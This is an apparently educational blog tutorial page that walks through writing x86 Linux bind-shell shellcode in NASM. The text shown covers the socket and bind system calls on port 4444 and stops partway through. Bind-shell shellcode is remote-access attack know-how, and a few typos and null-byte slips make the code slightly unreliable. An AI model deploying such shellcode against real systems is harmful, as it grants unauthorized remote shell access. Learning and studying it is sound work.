@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="norsec0de">
+<meta name="description" content="In Part 1: Disassembling and Understanding Shellcode we disassembled some shellcode and found out the steps required to create a bind shell. In Part 2, we will take each of these 6 steps, understand them and write assembly instructions to call them.
+The steps we need to follow to create our bind shell are:
+ Socket Bind Listen Accept Dup2 Execve  We are going to spend a lot of time working with NASM (The Netwide Assembler)." />
+<meta name="keywords" content="infosec, norsey, norsec0de, assembly, shellcode, tutorial" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://norsec0de.github.io/posts/part-2-building-the-shellcode/" />
+
+
+    <title>
+        
+            part 2: building the shellcode :: norsey&#39;s hideout 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="http://norsec0de.github.io/main.393856bf2c430bb6c01d7af07c6fe966e7cce8073435cfbbc46e590bab7405ef.css">
+
+
+
+
+
+
+<meta itemprop="name" content="part 2: building the shellcode">
+<meta itemprop="description" content="In Part 1: Disassembling and Understanding Shellcode we disassembled some shellcode and found out the steps required to create a bind shell. In Part 2, we will take each of these 6 steps, understand them and write assembly instructions to call them.
+The steps we need to follow to create our bind shell are:
+ Socket Bind Listen Accept Dup2 Execve  We are going to spend a lot of time working with NASM (The Netwide Assembler).">
+<meta itemprop="datePublished" content="2014-04-24T12:00:06+00:00" />
+<meta itemprop="dateModified" content="2014-04-24T12:00:06+00:00" />
+<meta itemprop="wordCount" content="5356">
+<meta itemprop="image" content="http://norsec0de.github.io/"/>
+
+
+
+<meta itemprop="keywords" content="assembly,shellcode,tutorial," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://norsec0de.github.io/"/>
+
+<meta name="twitter:title" content="part 2: building the shellcode"/>
+<meta name="twitter:description" content="In Part 1: Disassembling and Understanding Shellcode we disassembled some shellcode and found out the steps required to create a bind shell. In Part 2, we will take each of these 6 steps, understand them and write assembly instructions to call them.
+The steps we need to follow to create our bind shell are:
+ Socket Bind Listen Accept Dup2 Execve  We are going to spend a lot of time working with NASM (The Netwide Assembler)."/>
+
+
+
+
+
+    <meta property="article:section" content="shellcode" />
+
+    <meta property="article:section" content="tutorial" />
+
+
+
+    <meta property="article:published_time" content="2014-04-24 12:00:06 &#43;0000 &#43;0000" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="http://norsec0de.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">norsey&#39;s hideout</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="http://norsec0de.github.io/posts">intel</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="http://norsec0de.github.io/posts/part-2-building-the-shellcode/">part 2: building the shellcode</a></h2>
+
+            
+
+            
+
+            <div class="post-content">
+                <p>In <a href="http://norsec0de.github.io/posts/part-1-disassembling-and-understanding-shellcode/">Part 1: Disassembling and Understanding Shellcode</a> we disassembled some shellcode and found out the steps required to create a bind shell. In Part 2, we will take each of these 6 steps, understand them and write assembly instructions to call them.</p>
+<p>The steps we need to follow to create our bind shell are:</p>
+<ol>
+<li>Socket</li>
+<li>Bind</li>
+<li>Listen</li>
+<li>Accept</li>
+<li>Dup2</li>
+<li>Execve</li>
+</ol>
+<p>We are going to spend a lot of time working with <a href="http://www.nasm.us/">NASM (The Netwide Assembler)</a>. To install NASM, run the following command:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install nasm
+</code></pre></div><p>We are also going to need some kernel headers for researching the calls.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install linux-headers-<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span>
+</code></pre></div><p>Once that is completed, create a file called <code>bindshell.nasm</code> and paste the following code into it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#66d9ef">global</span> _start
+
+<span style="color:#66d9ef">section</span> .text
+_start:
+
+        <span style="color:#75715e">; Start of our shellcode</span>
+</code></pre></div><p>That should give us enough to get started, lets start working on the first call.</p>
+<p><!-- raw HTML omitted --></p>
+<h1 id="step-1-socket">Step 1: Socket</h1>
+<p>Calling up the <a href="http://man7.org/linux/man-pages/man2/socket.2.html">man</a> page for socket gives us the following information:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">socket() creates an endpoint for communication and returns a descriptor.
+Usage:
+  int socket(int domain, int type, int protocol);
+</code></pre></div><p>We can see that the socket requires 3 arguments to be passed to it: </p>
+<table>
+<thead>
+<tr>
+<th>Argument</th>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Domain</td>
+<td>Integer</td>
+<td>The protocol family which will be used for communication</td>
+</tr>
+<tr>
+<td>Type</td>
+<td>Integer</td>
+<td>The communication semantics of the socket</td>
+</tr>
+<tr>
+<td>Protocol</td>
+<td>Integer</td>
+<td>The particular protocol to be used with the socket</td>
+</tr>
+</tbody>
+</table>
+<p><!-- raw HTML omitted --></p>
+<p>Lets start with the <code>socket</code> call itself. Searching on Google shows that the socket is a sub function of the <code>sys_socketcall</code> system call. We&rsquo;ll first need to find out what the value of this system call is to be able to use it in our assembly code.</p>
+<p>Take a look at the following header file so see what the system call value is for <code>sys_socketcall</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">less /usr/include/i386-linux-gnu/asm/unistd_32.h
+</code></pre></div><p>In that file we can see the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">#define __NR_socketcall 102
+</code></pre></div><p>Great, now we know our first value.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_socketcall = 102
+</code></pre></div><p>However, we don&rsquo;t yet know the sub functions for the <code>sys_socketcall</code>.</p>
+<p>Take a look in the <code>net.h</code> file and you&rsquo;ll find the complete list of sub calls for <code>sys_socketcall</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">less /usr/src/linux-headers-3.2.0-4-common/include/linux/net.h
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">#define SYS_SOCKET       1      /* sys_socket(2)        */
+#define SYS_BIND         2      /* sys_bind(2)          */
+#define SYS_CONNECT      3      /* sys_connect(2)       */
+#define SYS_LISTEN       4      /* sys_listen(2)        */
+#define SYS_ACCEPT       5      /* sys_accept(2)        */
+#define SYS_GETSOCKNAME  6      /* sys_getsockname(2)   */
+#define SYS_GETPEERNAME  7      /* sys_getpeername(2)   */
+#define SYS_SOCKETPAIR   8      /* sys_socketpair(2)    */
+#define SYS_SEND         9      /* sys_send(2)          */
+#define SYS_RECV         10     /* sys_recv(2)          */
+#define SYS_SENDTO       11     /* sys_sendto(2)        */
+#define SYS_RECVFROM     12     /* sys_recvfrom(2)      */
+#define SYS_SHUTDOWN     13     /* sys_shutdown(2)      */
+#define SYS_SETSOCKOPT   14     /* sys_setsockopt(2)    */
+#define SYS_GETSOCKOPT   15     /* sys_getsockopt(2)    */
+#define SYS_SENDMSG      16     /* sys_sendmsg(2)       */
+#define SYS_RECVMSG      17     /* sys_recvmsg(2)       */
+#define SYS_ACCEPT4      18     /* sys_accept4(2)       */
+#define SYS_RECVMMSG     19     /* sys_recvmmsg(2)      */
+#define SYS_SENDMMSG     20     /* sys_sendmmsg(2)      */
+</code></pre></div><p>We can see from this file that:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">socket    = 1
+bind      = 2
+listen    = 4
+accept    = 5
+</code></pre></div><p>These will be the values we are going to use for each of the different sub calls.</p>
+<p>In summary we know now that the system call for <code>socket</code> is under the <code>sys_socketcall</code> system call. The value for <code>sys_socketcall</code> is <code>102</code>.</p>
+<p>We also know that the value of the <code>sys_socket</code> sub function is <code>1</code>. So we can start piecing the system call together.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_socketcall[102].socket[1](domain, type, protocol)
+</code></pre></div><p>Lets find the values for these arguments.</p>
+<p><!-- raw HTML omitted --></p>
+<h3 id="int-domain">int domain</h3>
+<p>Back in the <code>man</code> page for <code>socket</code> we can see the explanation of domain as:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">The domain argument specifies a communication domain; this selects
+the protocol family which will be used for communication.  These
+families are defined in sys/socket.h.
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">AF_UNIX, AF_LOCAL   Local communication
+AF_INET             IPv4 Internet protocols
+AF_INET6            IPv6 Internet protocols
+AF_IPX              IPX - Novell protocols
+AF_NETLINK          Kernel user interface device
+AF_X25              ITU-T X.25 / ISO-8208 protocol
+AF_AX25             Amateur radio AX.25 protocol
+AF_ATMPVC           Access to raw ATM PVCs
+AF_APPLETALK        Appletalk
+AF_PACKET           Low level packet interface
+</code></pre></div><p>We&rsquo;ll be using IPv4 for our bind shell so we&rsquo;ll set our domain to <code>AF_INET</code>. To find the integer value for <code>AF_INET</code> we use more Google-Fu and we find this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">/* Supported address families. */
+#define AF_UNSPEC      0
+#define AF_UNIX        1     /* Unix domain sockets           */
+#define AF_INET        2     /* Internet IP Protocol          */
+#define AF_AX25        3     /* Amateur Radio AX.25           */
+#define AF_IPX         4     /* Novell IPX                    */
+#define AF_APPLETALK   5     /* Appletalk DDP                 */
+#define AF_NETROM      6     /* Amateur radio NetROM          */
+#define AF_BRIDGE      7     /* Multiprotocol bridge          */
+#define AF_AAL5        8     /* Reserved for Werner&#39;s ATM     */
+#define AF_X25         9     /* Reserved for X.25 project     */
+#define AF_INET6       10    /* IP version 6                  */
+</code></pre></div><p>The integer of AF_INET for our domain argument will be <code>2</code></p>
+<p><!-- raw HTML omitted --></p>
+<h2 id="int-type">int type</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">The socket has the indicated type, which specifies the communication
+semantics.  Currently defined types are:
+
+SOCK_STREAM     Provides sequenced, reliable, two-way, connection-
+                based byte streams.  An out-of-band data transmission
+                mechanism may be supported.
+SOCK_DGRAM      Supports datagrams (connectionless, unreliable
+                messages of a fixed maximum length).
+SOCK_SEQPACKET  Provides a sequenced, reliable, two-way connection-
+                based data transmission path for datagrams of fixed
+                maximum length; a consumer is required to read an
+                entire packet with each input system call.
+SOCK_RAW        Provides raw network protocol access.
+SOCK_RDM        Provides a reliable datagram layer that does not
+                guarantee ordering.
+SOCK_PACKET     Obsolete and should not be used in new programs; see
+                packet(7).
+</code></pre></div><p><code>SOCK_STREAM</code> appears top be the best choice here for our IPv4 bind shell.</p>
+<p>More Google-Fu</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">/* Socket types. */
+#define SOCK_STREAM       1        /* stream (connection) socket     */
+#define SOCK_DGRAM        2        /* datagram (conn.less) socket    */
+#define SOCK_RAW          3        /* raw socket                     */
+#define SOCK_RDM          4        /* reliably-delivered message     */
+#define SOCK_SEQPACKET    5        /* sequential packet socket       */
+#define SOCK_PACKET       10       /* linux specific way of          */
+                                   /* getting packets at the dev     */
+                                   /* level.  For writing rarp and   */
+                                   /* other similar things on the    */
+                                   /* user level.                    */
+</code></pre></div><p>Our integer of <code>SOCK_STREAM</code> for our socket type will be <code>1</code>.</p>
+<p><!-- raw HTML omitted --></p>
+<h2 id="int-protocol">int protocol</h2>
+<p>Again, consult the <a href="http://man7.org/linux/man-pages/man2/socket.2.html">man</a> page for sockets.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">The protocol specifies a particular protocol to be used with the
+socket.  Normally only a single protocol exists to support a
+particular socket type within a given protocol family, in which case
+protocol can be specified as 0.  However, it is possible that many
+protocols may exist, in which case a particular protocol must be
+specified in this manner.  The protocol number to use is specific to
+the “communication domain” in which communication is to take place;
+see protocols(5).
+</code></pre></div><p>Find the protocol in the header file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">less /usr/src/linux-headers-3.2.0-4-common/include/linux/in.h
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">/* Standard well-defined IP protocols.  */
+enum {
+  IPPROTO_IP      = 0,         /* Dummy protocol for TCP                    */
+  IPPROTO_ICMP    = 1,         /* Internet Control Message Protocol         */
+  IPPROTO_IGMP    = 2,         /* Internet Group Management Protocol        */
+  IPPROTO_IPIP    = 4,         /* IPIP tunnels (older KA9Q tunnels use 94)  */
+  IPPROTO_TCP     = 6,         /* Transmission Control Protocol             */
+  IPPROTO_EGP     = 8,         /* Exterior Gateway Protocol                 */
+  IPPROTO_PUP     = 12,        /* PUP protocol                              */
+  IPPROTO_UDP     = 17,        /* User Datagram Protocol                    */
+  IPPROTO_IDP     = 22,        /* XNS IDP protocol                          */
+  IPPROTO_DCCP    = 33,        /* Datagram Congestion Control Protocol      */
+  IPPROTO_RSVP    = 46,        /* RSVP protocol                             */
+  IPPROTO_GRE     = 47,        /* Cisco GRE tunnels (rfc 1701,1702)         */
+  IPPROTO_IPV6    = 41,        /* IPv6-in-IPv4 tunnelling                   */
+  IPPROTO_ESP     = 50,        /* Encapsulation Security Payload protocol   */
+  IPPROTO_AH      = 51,        /* Authentication Header protocol            */
+  IPPROTO_BEETPH  = 94,        /* IP option pseudo header for BEET          */
+  IPPROTO_PIM     = 103,       /* Protocol Independent Multicast            */
+  IPPROTO_COMP    = 108,       /* Compression Header protocol               */
+  IPPROTO_SCTP    = 132,       /* Stream Control Transport Protocol         */
+  IPPROTO_UDPLITE = 136,       /* UDP-Lite (RFC 3828)                       */
+  IPPROTO_RAW     = 255,       /* Raw IP packets                            */
+  IPPROTO_MAX
+};
+</code></pre></div><p>For our IPv4 bind shell the best choice would be <code>IPPROTO_IP</code> which has the value of <code>0</code>.</p>
+<p>If we add these new parameters to the socket call, we get the following call.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_socketcall[102 =&gt; eax].socket[1 =&gt; ebx](2, 1, 0 =&gt; ecx)
+</code></pre></div><p>Seems simple enough, lets get these values into the registers.</p>
+<p>Open up the <code>bindshell.nasm</code> file and start creating our assembly code.</p>
+<p>First, we need to clear out any values that may exist in eax or ebx. We can do this by xoring the register with itself. We&rsquo;ll also add comments to the shellcode as we go so we know what we are doing.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#66d9ef">global</span> _start            
+
+<span style="color:#66d9ef">section</span> .text
+_start:
+
+        <span style="color:#75715e">; Start of our shellcode</span>
+        <span style="color:#75715e">; sys_socket (creating a socket for our connection)</span>
+
+        <span style="color:#a6e22e">xor</span> eax, eax    <span style="color:#75715e">; clear the value of eax </span>
+        <span style="color:#a6e22e">xor</span> ebx, ebx    <span style="color:#75715e">; clear the value of ebx </span>
+</code></pre></div><p>Write the values of the <code>sys_socketcall</code> and <code>sys_socket</code> into the registers.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>            <span style="color:#75715e">; set eax to 102 (sys_socketcall)</span>
+<span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">1</span>              <span style="color:#75715e">; set ebx to 1 (sys_socket)</span>
+</code></pre></div><p>To build the parameters, there are two things we need to keep in mind. Firstly, we need to pass them onto the stack in <code>reverse</code> order. This is so when the system reads the location it is reading in the correct order.</p>
+<p>Secondly, we cannot push or mov a value of 0 as that will automatically create a null byte (\x00) which will kill our shellcode. Instead we&rsquo;ll create a null in ecx by xoring it with itself and then pushing that value to the stack.</p>
+<p>Lets push these parameters onto the stack.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> ecx, ecx     <span style="color:#75715e">; clear the value of ecx</span>
+<span style="color:#a6e22e">push</span> ecx         <span style="color:#75715e">; push a null onto the stack (IPPROTO_IP = 0)</span>
+<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">1</span>           <span style="color:#75715e">; push a 1 to the stack (SOCK_STREAM = 1)</span>
+<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">2</span>           <span style="color:#75715e">; push a 2 to the stack (AF_INET = 2)</span>
+</code></pre></div><p>Now that our arguments are on the stack, we need to mov the location of them into ecx. Since esp always points to the top of the stack, we can just move esp into ecx and then ecx will point to our argument location on the stack.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">mov</span> ecx, esp        <span style="color:#75715e">; push the location of our arguments into ecx</span>
+</code></pre></div><p>Now we are ready to call the <code>sys_socket</code> function. We call a function using a int 0x80 (\x80).</p>
+<p>Before we do that, we need to remember that in the man page for socket, the socket file descriptor will be returned to us. We are going to need this descriptor in other calls so we need to save it somewhere. We can put the value into edx for now.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>           <span style="color:#75715e">; call sys_socket</span>
+<span style="color:#a6e22e">mov</span> edx, eax       <span style="color:#75715e">; save the returned value to edx (socket file descriptor)</span>
+</code></pre></div><p>That&rsquo;s it for the socket call, on to the bind call.</p>
+<h1 id="step-2-bind">Step 2: Bind</h1>
+<p>Now that we&rsquo;ve called the <code>sys_socket</code> and received the socket file descriptor, lets start building our <code>sys_bind</code>.</p>
+<p>The <a href="http://man7.org/linux/man-pages/man2/bind.2.html">man</a> page for bind shows us:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">When a socket is created with socket(2), it exists in a name space
+(address family) but has no address assigned to it.  bind() assigns
+the address specified by addr to the socket referred to by the file
+descriptor sockfd.  addrlen specifies the size, in bytes, of the
+address structure pointed to by addr.  Traditionally, this operation
+is called “assigning a name to a socket”.
+</code></pre></div><p>The usage for bind is:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+</code></pre></div><p>We already know that this is part of <code>sys_socketcall</code> so the value for <code>eax</code> will be <code>102</code>.</p>
+<p>We also know from earlier that sys_bind has the value <code>2</code> which we will use in <code>ebx</code>.</p>
+<p>Lets look at the 3 arguments it requires though:</p>
+<table>
+<thead>
+<tr>
+<th>Argument</th>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sockfd</td>
+<td>Integer</td>
+<td>The socket file descriptor which we got from our first socket call</td>
+</tr>
+<tr>
+<td>sockaddr</td>
+<td>Integer</td>
+<td>The socket address consisting of protocol, port, ip address</td>
+</tr>
+<tr>
+<td>addrleng</td>
+<td>Integer</td>
+<td>The IP address length</td>
+</tr>
+</tbody>
+</table>
+<p><!-- raw HTML omitted --></p>
+<h2 id="int-sockfd">int sockfd</h2>
+<p>We already have the socket file descriptor saved in edx so we know this value.</p>
+<h2 id="int-sockaddr">int sockaddr</h2>
+<p>The actual structure passed for the <code>addr</code> argument will depend on the address family.</p>
+<p>The <code>sockaddr</code> structure is defined as:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">struct sockaddr {
+  sa_family_t   sa_family;
+  char          sa_data[14];
+}
+</code></pre></div><p>The purpose of this structure is to cast the structure pointer passed in <code>addr</code> in order to avoid compiler warnings.</p>
+<p>When we convert this to plain &ldquo;english&rdquo;, we need to pass it 3 things:</p>
+<ul>
+<li><code>protocol</code></li>
+<li><code>port</code></li>
+<li><code>ip address</code></li>
+</ul>
+<p>These 3 arguments need to be placed together on the stack and then the location of these needs to be passed to <code>the sys_bind</code> call.</p>
+<h3 id="protocol">protocol</h3>
+<p>The protocol we are using is <code>AF_INET</code> which if you recall is IPv4 and has a value of <code>2</code>.</p>
+<h3 id="port">port</h3>
+<p>We need to choose a port number to bind to our socket and pass this value in hex to the second argument. Finding integer in hex is something we&rsquo;ll need to do frequently so lets create a script to do it for us.</p>
+<p>Create a file called <code>int2hex.py</code> and paste the following code into it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
+<span style="color:#f92672">import</span> sys
+
+<span style="color:#66d9ef">print</span> hex(int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]))
+</code></pre></div><p>Make the file executable <code>chmod +x int2hex.py</code> and then run it, passing the desired port as an argument:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">./int2hex.py <span style="color:#ae81ff">4444</span>
+</code></pre></div><p>This will take the desired port number and return its hex value:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">0x115c
+</code></pre></div><p>If we convert this to little endian, we&rsquo;ll end up with:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">\x5c\x11
+</code></pre></div><p>which can also be represented as</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">0x5c11
+</code></pre></div><h3 id="ip-address">ip address</h3>
+<p>The last parameter we need to pass is the IP Address. Since we want to listen on any address we&rsquo;ll use the <code>INADDR_ANY</code> argument which has a value of <code>0</code>.</p>
+<p>Combining these produces our final value for <code>sockaddr</code> as:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">(2, \x5x\x11, 0)
+</code></pre></div><h2 id="addrlen">addrlen</h2>
+<p>The last argument needed for our <code>sys_bind</code> call is the address length. Since we&rsquo;re using IPv4, this will be <code>16</code>.</p>
+<p>In summary, our <code>sys_socket</code> call now looks like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sys_sockcall[102 =&gt; eax].sys_bind[2 =&gt; ebx](edx, (2, \x5x\x11, 0), 16)[ =&gt; ecx]
+</code></pre></div><p>Lets add these new values to our assembly code.</p>
+<p>Start by clearing out eax.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> eax, eax    <span style="color:#75715e">; clear the value of eax</span>
+</code></pre></div><p>Next lets push our 3 arguments that make up sockaddr onto the stack in reverse order.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">push</span> eax           <span style="color:#75715e">; push eax to the stack since it&#39;s null (INADDR_ANY = 0)</span>
+<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">0x5C11</span>   <span style="color:#75715e">; push our port number to the stack (Port = 4444)</span>
+<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">WORD</span> <span style="color:#ae81ff">2</span>        <span style="color:#75715e">; push protocol argument to the stack (AF_INET = 2)</span>
+</code></pre></div><p>Now that we have these 3 values sitting on the stack, lets store their location in ecx using esp</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move value of esp into ecx, the location of our sockaddr arguments</span>
+</code></pre></div><p>Lets start the final set of the <code>bind</code> arguments. First, we need to push the <code>addrlen</code> argument</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">push</span> <span style="color:#ae81ff">16</span>            <span style="color:#75715e">; push addrlen to stack (addrlen = 16)</span>
+</code></pre></div><p>Now push the location of our <code>sockaddr</code> argument to the stack.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">push</span> ecx           <span style="color:#75715e">; push ecx to stack (ecx = location of our sockaddr arguments)</span>
+</code></pre></div><p>Finally push the <code>sockfd</code> stored in <code>edx</code> to the stack.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">push</span> edx           <span style="color:#75715e">; push edx (sockfd value stored in edx)</span>
+</code></pre></div><p>We now have all the arguments stored on the stack, so we need to populate the <code>eax</code>, <code>ebx</code> and <code>ecx</code> values.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">xor</span> eax, eax       <span style="color:#75715e">; clear value of eax</span>
+<span style="color:#a6e22e">xor</span> ebx, ebx       <span style="color:#75715e">; clear value of ebx</span>
+<span style="color:#a6e22e">mov</span> eax, <span style="color:#ae81ff">102</span>       <span style="color:#75715e">; move value of 102 into eax (sys_sockcall = 102)</span>
+<span style="color:#a6e22e">mov</span> ebx, <span style="color:#ae81ff">2</span>         <span style="color:#75715e">; move value of 2 into eax (sys_bind = 2)</span>
+<span style="color:#a6e22e">mov</span> ecx, esp       <span style="color:#75715e">; move the arguments into ecx</span>
